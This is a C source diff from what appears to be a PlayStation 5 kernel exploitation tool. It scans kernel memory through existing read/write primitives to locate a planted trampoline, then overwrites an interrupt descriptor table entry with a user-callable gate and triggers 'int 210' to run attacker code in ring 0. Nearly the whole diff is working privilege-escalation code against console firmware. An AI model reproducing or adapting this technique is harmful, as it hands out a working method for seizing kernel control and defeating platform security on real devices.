@@ -1328,64 +1328,145 @@ static void campaign_kmod_kldload(void) {
      * userland.  The CPU transitions to ring 0 through the IDT gate and
      * executes our trampoline → hv_init → campaigns → IRETQ back.
      *
+     * Since kldstat/kldsym are broken on PS5 (Sony modifications — they
+     * return all zeros), we locate the module by scanning kernel virtual
+     * memory for the trampoline's machine code signature.  The trampoline
+     * is at offset 0 in .text, which is the first SHF_ALLOC section, so
+     * it sits at the very start of the page-aligned kmem_malloc allocation.
+     *
      * This mirrors the approach used by r0gdb / kstuff for kernel code
      * execution on FW 4.03 (IDT hooking for int1 / int13).
      */
     if (first_qword == 0) {
         printf("\n[*] Step 4b: SYSINIT/MOD_LOAD did not fire — trying IDT invocation...\n");
 
-        /* 4b-1: Get module base address via kldstat */
-        struct kld_file_stat kstat;
-        memset(&kstat, 0, sizeof(kstat));
-        kstat.version = sizeof(struct kld_file_stat);
-        ret = syscall(SYS_kldstat, kid, &kstat);
-        if (ret < 0) {
-            printf("[-] kldstat failed: errno=%d (%s)\n", errno, strerror(errno));
-            goto idt_skip;
-        }
-        printf("[+] kldstat: base=0x%lx, size=0x%lx, name='%.64s'\n",
-               (unsigned long)kstat.address, (unsigned long)kstat.size, kstat.name);
+        /* ── 4b-1: Locate hv_idt_trampoline in kernel memory ── */
 
-        if (kstat.address == 0 || kstat.size == 0) {
-            printf("[-] kldstat returned invalid module info.\n");
-            goto idt_skip;
+        /* Machine code signature of hv_idt_trampoline.
+         * The function is: push rax..r11, xor edi,edi, call hv_init,
+         * pop r11..rax, iretq.  We match the prefix and suffix around
+         * the 5-byte relative call (which varies after relocation). */
+        static const uint8_t tramp_prefix[] = {
+            0x50, 0x51, 0x52, 0x56, 0x57,               /* push rax,rcx,rdx,rsi,rdi */
+            0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, /* push r8,r9,r10,r11 */
+            0x31, 0xff                                   /* xor edi,edi */
+        };
+        static const uint8_t tramp_suffix[] = {
+            0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58, /* pop r11,r10,r9,r8 */
+            0x5f, 0x5e, 0x5a, 0x59, 0x58,               /* pop rdi,rsi,rdx,rcx,rax */
+            0x48, 0xcf                                   /* iretq */
+        };
+        const int suffix_off = 0x14;  /* offset of suffix within trampoline */
+
+        printf("[*] g_kdata_base=0x%lx  g_ktext_base=0x%lx\n",
+               (unsigned long)g_kdata_base, (unsigned long)g_ktext_base);
+
+        /* Scan range: start well past kernel static data, scan forward.
+         * On FW 4.03, kernel data extends ~112MB from base (rootvnode at
+         * +0x66E74C0).  Module allocations from kmem_malloc come after that.
+         * We read only the first 64 bytes of each page (the trampoline is
+         * at offset 0 of the page-aligned allocation). */
+        uint64_t scan_start = g_kdata_base + 0x8000000;   /* +128MB */
+        uint64_t scan_len   = 0x40000000;                  /* 1GB */
+        uint64_t trampoline_kva = 0;
+        uint64_t pages_scanned = 0, pages_readable = 0;
+        uint8_t hdr[64];
+
+        printf("[*] Scanning 0x%lx → 0x%lx for trampoline at page boundaries...\n",
+               (unsigned long)scan_start, (unsigned long)(scan_start + scan_len));
+
+        for (uint64_t addr = scan_start; addr < scan_start + scan_len; addr += 0x1000) {
+            pages_scanned++;
+            if (pages_scanned % 8192 == 0)   /* progress every 32MB */
+                printf("    ...%luMB scanned, %lu readable\n",
+                       (unsigned long)(pages_scanned >> 8),
+                       (unsigned long)pages_readable);
+
+            if (kernel_copyout(addr, hdr, sizeof(hdr)) != 0)
+                continue;
+            pages_readable++;
+
+            if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) != 0)
+                continue;
+            if (memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) != 0)
+                continue;
+
+            trampoline_kva = addr;
+            printf("[+] FOUND trampoline at 0x%lx!\n", (unsigned long)addr);
+            printf("    bytes: ");
+            for (int b = 0; b < 35; b++) printf("%02x ", hdr[b]);
+            printf("\n");
+            break;
         }
 
-        /* 4b-2: Find hv_idt_trampoline offset from the embedded .ko symbol table */
-        uint64_t trampoline_offset = 0;
-        {
-            /* Re-use the ELF types already defined above */
-            Elf64_Ehdr_t *ko_ehdr = (Elf64_Ehdr_t *)KMOD_KO;
-            if (ko_ehdr->e_shoff && ko_ehdr->e_shnum > 0) {
-                Elf64_Shdr_t *ko_shdrs = (Elf64_Shdr_t *)((const uint8_t *)KMOD_KO + ko_ehdr->e_shoff);
-                for (uint16_t s = 0; s < ko_ehdr->e_shnum; s++) {
-                    if (ko_shdrs[s].sh_type == SHT_SYMTAB) {
-                        Elf64_Sym_t *syms = (Elf64_Sym_t *)((const uint8_t *)KMOD_KO + ko_shdrs[s].sh_offset);
-                        uint64_t nsyms = ko_shdrs[s].sh_size / sizeof(Elf64_Sym_t);
-                        const char *strtab = (const char *)((const uint8_t *)KMOD_KO + ko_shdrs[ko_shdrs[s].sh_link].sh_offset);
-                        for (uint64_t i = 0; i < nsyms; i++) {
-                            if (strcmp(strtab + syms[i].st_name, "hv_idt_trampoline") == 0) {
-                                trampoline_offset = syms[i].st_value;
-                                printf("[+] hv_idt_trampoline: .text+0x%lx\n",
-                                       (unsigned long)trampoline_offset);
+        /* Fallback: scan for the sentinel value (result_kva in .data) */
+        if (trampoline_kva == 0) {
+            printf("[*] Trampoline not at page start — trying sentinel scan...\n");
+            printf("[*] Searching for sentinel 0x%lx in same range...\n",
+                   (unsigned long)result_kva);
+
+            uint8_t page[4096];
+            uint64_t sentinel_addr = 0;
+            for (uint64_t addr = scan_start; addr < scan_start + scan_len; addr += 0x1000) {
+                if (kernel_copyout(addr, page, sizeof(page)) != 0)
+                    continue;
+                for (int off = 0; off <= 4096 - 8; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, page + off, 8);
+                    if (v == result_kva) {
+                        sentinel_addr = addr + off;
+                        printf("[+] Found sentinel at 0x%lx\n",
+                               (unsigned long)sentinel_addr);
+                        break;
+                    }
+                }
+                if (sentinel_addr) break;
+            }
+
+            if (sentinel_addr) {
+                /* Sentinel is in .data; .text is before it.  Search backward
+                 * for the trampoline signature at page boundaries. */
+                uint64_t search_lo = (sentinel_addr & ~0xFFFULL) - 0x10000;  /* 64KB back */
+                for (uint64_t addr = search_lo; addr < sentinel_addr; addr += 0x1000) {
+                    if (kernel_copyout(addr, hdr, sizeof(hdr)) != 0) continue;
+                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                        trampoline_kva = addr;
+                        printf("[+] FOUND trampoline at 0x%lx (via backward search)!\n",
+                               (unsigned long)addr);
+                        break;
+                    }
+                }
+                /* If still not found at page boundary, scan the page containing .text */
+                if (trampoline_kva == 0) {
+                    for (uint64_t addr = search_lo; addr < sentinel_addr; addr += 0x1000) {
+                        if (kernel_copyout(addr, page, sizeof(page)) != 0) continue;
+                        for (int off = 0; off <= 4096 - 35; off++) {
+                            if (memcmp(page + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                                memcmp(page + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                                trampoline_kva = addr + off;
+                                printf("[+] FOUND trampoline at 0x%lx (non-aligned)!\n",
+                                       (unsigned long)trampoline_kva);
                                 break;
                             }
                         }
-                        break;  /* only one .symtab */
+                        if (trampoline_kva) break;
                     }
                 }
             }
         }
-        if (trampoline_offset == 0) {
-            printf("[-] Could not find hv_idt_trampoline in .ko symbol table.\n");
+
+        printf("[*] Scan: %lu pages checked, %lu readable\n",
+               (unsigned long)pages_scanned, (unsigned long)pages_readable);
+
+        if (trampoline_kva == 0) {
+            printf("[-] Trampoline not found in scan range 0x%lx-0x%lx.\n",
+                   (unsigned long)scan_start, (unsigned long)(scan_start + scan_len));
+            printf("    Check if g_kdata_base is correct, or try wider range.\n");
             goto idt_skip;
         }
 
-        /* .text is the first SHF_ALLOC section → starts at module base */
-        uint64_t trampoline_kva = kstat.address + trampoline_offset;
-        printf("[*] Trampoline kernel VA: 0x%lx\n", (unsigned long)trampoline_kva);
-
-        /* 4b-3: Read IDTR (SIDT is unprivileged on AMD64) */
+        /* ── 4b-2: Read IDTR (SIDT is unprivileged on AMD64) ── */
         struct {
             uint16_t limit;
             uint64_t base;
@@ -1394,22 +1475,20 @@ static void campaign_kmod_kldload(void) {
         printf("[*] IDTR: base=0x%lx, limit=0x%x (%u entries)\n",
                (unsigned long)idtr.base, idtr.limit, (idtr.limit + 1) / 16);
 
-        /* 4b-4: Choose an unused interrupt vector */
         #define HV_IDT_VECTOR 210  /* 0xD2 — well above PIC/APIC range */
 
         if (((unsigned)(HV_IDT_VECTOR) + 1) * 16 > (unsigned)(idtr.limit + 1)) {
-            printf("[-] IDT has only %u entries — vector %u out of range.\n",
-                   (idtr.limit + 1) / 16, HV_IDT_VECTOR);
+            printf("[-] IDT too small for vector %u.\n", HV_IDT_VECTOR);
             goto idt_skip;
         }
 
         struct idt_gate {
-            uint16_t offset_lo;    /* bits 0-15 of handler VA */
-            uint16_t selector;     /* kernel CS */
-            uint8_t  ist;          /* IST index (0 = use TSS RSP0) */
-            uint8_t  type_attr;    /* P | DPL | 0 | type */
-            uint16_t offset_mid;   /* bits 16-31 */
-            uint32_t offset_hi;    /* bits 32-63 */
+            uint16_t offset_lo;
+            uint16_t selector;
+            uint8_t  ist;
+            uint8_t  type_attr;
+            uint16_t offset_mid;
+            uint32_t offset_hi;
             uint32_t reserved;
         } __attribute__((packed));
 
@@ -1419,39 +1498,39 @@ static void campaign_kmod_kldload(void) {
         struct idt_gate orig_gate;
         kernel_copyout(gate_addr, &orig_gate, sizeof(orig_gate));
 
-        /* Get kernel CS from a known-good gate (e.g. #PF = vector 14) */
+        /* Get kernel CS from #PF handler (vector 14) */
         struct idt_gate ref_gate;
         kernel_copyout(idtr.base + 14 * sizeof(struct idt_gate), &ref_gate, sizeof(ref_gate));
         uint16_t kernel_cs = ref_gate.selector;
-        printf("[*] Kernel CS: 0x%04x (from IDT[14] page-fault handler)\n", kernel_cs);
+        printf("[*] Kernel CS: 0x%04x (from IDT[14])\n", kernel_cs);
 
-        /* Build our gate: interrupt gate, DPL=3 (ring-3 can trigger via INT) */
+        /* ── 4b-3: Install IDT gate ── */
         struct idt_gate new_gate;
         memset(&new_gate, 0, sizeof(new_gate));
         new_gate.offset_lo  = (uint16_t)(trampoline_kva & 0xFFFF);
         new_gate.offset_mid = (uint16_t)((trampoline_kva >> 16) & 0xFFFF);
         new_gate.offset_hi  = (uint32_t)(trampoline_kva >> 32);
         new_gate.selector   = kernel_cs;
-        new_gate.ist        = 0;     /* use current thread's kernel stack */
+        new_gate.ist        = 0;
         new_gate.type_attr  = 0xEE;  /* P=1, DPL=3, type=0xE (interrupt gate) */
 
-        printf("[*] Installing IDT[%u] → 0x%lx (interrupt gate, DPL=3)...\n",
+        printf("[*] Installing IDT[%u] → 0x%lx ...\n",
                HV_IDT_VECTOR, (unsigned long)trampoline_kva);
         kernel_copyin(&new_gate, gate_addr, sizeof(new_gate));
 
-        /* Clear shared buffer before invocation */
-        memset(result_vaddr, 0, KMOD_RESULT_ALLOC_SIZE);
+        /* Clear buffer before invocation */
+        memset((void *)result_vaddr, 0, KMOD_RESULT_ALLOC_SIZE);
 
-        /* 4b-5: Fire! Ring 3 → IDT gate → ring 0 trampoline → hv_init → IRETQ */
+        /* ── 4b-4: Fire! ── */
         printf("[*] Triggering INT %u → hv_idt_trampoline → hv_init...\n", HV_IDT_VECTOR);
         __asm__ volatile("int $210" ::: "memory");
         printf("[+] Returned from ring-0 interrupt handler!\n");
 
-        /* 4b-6: Restore original IDT entry immediately */
+        /* ── 4b-5: Restore original IDT entry ── */
         kernel_copyin(&orig_gate, gate_addr, sizeof(orig_gate));
-        printf("[*] Original IDT[%u] restored.\n", HV_IDT_VECTOR);
+        printf("[*] IDT[%u] restored.\n", HV_IDT_VECTOR);
 
-        /* Re-read results */
+        /* Re-check results */
         memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
         if (first_qword != 0)
             printf("[+] Buffer is no longer zero — IDT invocation worked!\n");
